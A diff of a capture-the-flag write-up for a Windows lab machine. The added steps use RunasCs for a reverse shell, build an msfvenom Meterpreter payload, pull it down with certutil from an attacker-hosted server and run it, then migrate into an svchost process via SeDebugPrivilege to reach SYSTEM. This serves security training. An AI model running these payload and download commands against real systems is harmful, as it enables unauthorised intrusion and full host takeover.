@@ -204,7 +204,7 @@ Our payload basically is \\\10.10.X.X\somefile wrap in URL encoding.
 
 ```
 
-And this is the dead end because this hash is uncrackable.&#x20;
+And this is the dead end because this hash is uncrackable. :<
 
 
 
@@ -356,7 +356,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 By itself, `SeDebugPrivilege` gives a process the ability to view and modify the memory of other processes. Regardless of security descriptors, SeDebugPrivilege grants the token bearer access to any process or thread.&#x20;
 
 {% hint style="info" %}
-It's important to remember that attackers frequently enable this privilege in order to gain greater access to thread and process objects. Many C2 agents come with built-in code that allows you to do this instantly, and <mark style="color:red;">`mimikatz`</mark> also has a command that allows you to enable **`SeDebugPrivilege`**.\
+It's important to remember that attackers frequently enable this privilege in order to gain greater access to thread and process objects. Many C2 agents come with built-in code that allows you to do this instantly.\
 \
 Because it allows the creation of new remote threads in a target process, malware also takes advantage of this privilege to perform code injection into otherwise trustworthy processes.
 {% endhint %}
@@ -390,9 +390,11 @@ PS C:\Users\alaading> .\RunasCs.exe alaading f8g**********1m3 cmd.exe -r 10.10.X
 [+] Async process 'C:\Windows\system32\cmd.exe' with pid 1480 created in background.
 ```
 
+Catch it with nc:
+
 <figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020018.png" alt=""><figcaption><p>Getting a new shell with RunasCs</p></figcaption></figure>
 
-With this given shell, it is interesting to know that&#x20;
+Checking on the privilege info reveals suprising discovery:&#x20;
 
 ```
 C:\Windows\system32>whoami /priv
@@ -423,5 +425,164 @@ Privilege Name                Description                    State
 SeDebugPrivilege              Debug programs                 Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+With **`SeDebugPrivilege`** enabled, we can upload a Meterpreter shell to the machine and gain leverage access as Administrator.
+
+<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020419.png" alt=""><figcaption><p>Crafting our payload</p></figcaption></figure>
 
 ```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=X -f exe -o payload.exe
+```
+
+To get the malicious payload onto the target computer, host it on a Python http.server and then use:
+
+```
+certutil.exe -urlcache -f http://IP:PORT/payload.exe payload.exe
+```
+
+Finally, execute it by:
+
+```
+.\payload.exe
+```
+
+And voilà!!
+
+<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 020507.png" alt=""><figcaption><p>We got the shell.</p></figcaption></figure>
+
+Now, one of the oldest tricks on the book is to migrate into another Windows processes:
+
+{% hint style="info" %}
+There are many cases where you need to "migrate" a specific Windows working process, typically a shell.
+
+* An unstable shell.
+* Migrate from a 32-bit process to a 64-bit process.
+* Dealing with exploits require an interactive session.
+{% endhint %}
+
+This can be easily completed if you have a Meterpreter shell. All you have to do is wait for process migration to occur after launching the "migrate" command with the PID specified. In technical terms, by creating a thread inside another process, this is more of a malicious code injection than a true migration, and Meterpreter is exceptional at doing this. It creates a new remote thread and injects your current session into it, along with all of your loaded extensions and configurations.
+
+By migrating into a more privileged process, we should be able to gain NT AUTHRITY:
+
+```
+(Meterpreter 5)(C:\Windows\system32) > shell
+Process 2780 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> Get-Process svchost
+Get-Process svchost
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+    233      13     2712      12468       0.08     68   0 svchost                                                      
+    147       7     1340       6196       0.00    320   0 svchost                                                      
+    195      11     1748       8436       0.13    340   0 svchost                                                      
+    340      13     9756      14320      14.05    356   0 svchost                                                      
+    306      20     9508      14756       0.16    716   0 svchost                                                      
+     96       5      900       4008       0.00    740   0 svchost                                                      
+    765      16     5200      15036       0.56    760   0 svchost                                                      
+    681      16     3668      10192       0.69    832   0 svchost                                                      
+    245      10     1672       7032       0.08    880   0 svchost                                                      
+    276      13     3712      11508       1.11   1008   0 svchost                                                      
+    127      15     3164       7456       0.08   1064   0 svchost                                                      
+    175       9     1696       7920       0.05   1120   0 svchost                                                      
+    221       9     2196       7792       0.20   1132   0 svchost                                                      
+    233      12     2620      11760       1.08   1160   0 svchost                                                      
+    130       7     1236       5816       0.02   1168   0 svchost                                                      
+    427       9     2676       9196       0.20   1176   0 svchost                                                      
+    136       7     1236       5900       0.03   1284   0 svchost                                                      
+    141      10     1316       5988       0.02   1300   0 svchost                                                      
+    360      17     4980      14548       0.44   1340   0 svchost                                                      
+    347      15     3904      11436       0.06   1356   0 svchost                                                      
+    325      13     2020       9252       0.06   1412   0 svchost                                                      
+    232      13     2784       8360       0.63   1420   0 svchost                                                      
+    186      11     1880       8352       0.14   1528   0 svchost                                                      
+    328      10     2416       8736       0.28   1536   0 svchost                                                      
+    150       9     1568       6988       0.02   1652   0 svchost                                                      
+    130       7     1300       5940       0.03   1676   0 svchost                                                      
+    404      32     7772      17016       5.97   1736   0 svchost                                                      
+    171       9     2040       7632       0.16   1744   0 svchost                                                      
+    198      11     1940       8392       2.30   1792   0 svchost                                                      
+    176      12     3860      11384       0.05   1808   0 svchost                                                      
+    194      22     2612      10444       0.09   1816   0 svchost                                                      
+    178       9     1772       8588       0.02   1828   0 svchost                                                      
+    416      19    17296      31212       3.39   2060   0 svchost                                                      
+    399      16    11644      20868      13.89   2072   0 svchost                                                      
+    145       9     1520       6716       0.05   2104   0 svchost                                                      
+    145       8     1560       6468       0.02   2144   0 svchost                                                      
+    137       7     1220       5600       0.03   2192   0 svchost                                                      
+    213      11     1948       7228       0.02   2204   0 svchost                                                      
+    208      11     2180       8508       1.75   2224   0 svchost                                                      
+    175      10     2120      13244       0.06   2324   0 svchost                                                      
+    213      12     1732       7532       0.02   2332   0 svchost                                                      
+    247      15     5040      12768       0.17   2348   0 svchost                                                      
+    279      23     3636      12656       0.14   2636   0 svchost                                                      
+    466      18     3148      11832       0.11   2652   0 svchost                                                      
+    146       8     1604       7652       0.02   2848   0 svchost                                                      
+    409      26     3428      13296       0.09   2948   0 svchost                                                      
+    164      10     1972       7784       0.11   3256   0 svchost                                                      
+    195      15     6008      10324       0.03   4044   0 svchost                                                      
+    309      16    15252      17764      20.48   4260   0 svchost                                                      
+    175       9     3052       7948       0.00   4476   0 svchost                                                      
+    322      18     6428      22780       0.36   4580   0 svchost                                                      
+    136       8     2820      10036       0.23   4748   0 svchost                                                      
+    148       9     1572       6640       0.05   4952   0 svchost
+```
+
+Lastly, take the PID and let Meterpreter handle everything:
+
+```
+(Meterpreter 5)(C:\Windows\system32) > migrate 340
+[*] Migrating from 552 to 340...
+[*] Migration completed successfully.
+```
+
+**Avada Kedavra** :tada:
+
+```
+(Meterpreter 5)(C:\Windows\system32) > shell
+Process 4196 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0899-6CAF
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/15/2024  04:11 AM    <DIR>          .
+01/15/2024  04:11 AM    <DIR>          ..
+01/29/2024  10:53 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   6,227,570,688 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+441fb********************3f76ce1
+
+```
+
+
+
+## Resources
+
+* [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter)
+* [https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege](https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege)
